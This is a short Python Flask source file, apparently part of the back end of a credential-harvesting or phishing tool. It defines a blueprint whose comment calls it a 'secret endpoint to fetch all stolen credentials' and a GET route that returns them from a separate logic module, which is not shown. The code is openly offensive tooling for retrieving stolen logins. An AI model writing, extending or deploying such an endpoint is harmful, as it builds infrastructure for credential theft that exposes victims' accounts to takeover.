from flask import Blueprint
from libs.logic import Logic

logic = Logic()

credentials = Blueprint('credentials', __name__)


# Secret endpoint to fetch all stolen credentials.
@credentials.route('/credentials', methods=['GET'])
def get_credentials():
    return logic.get_credentials()
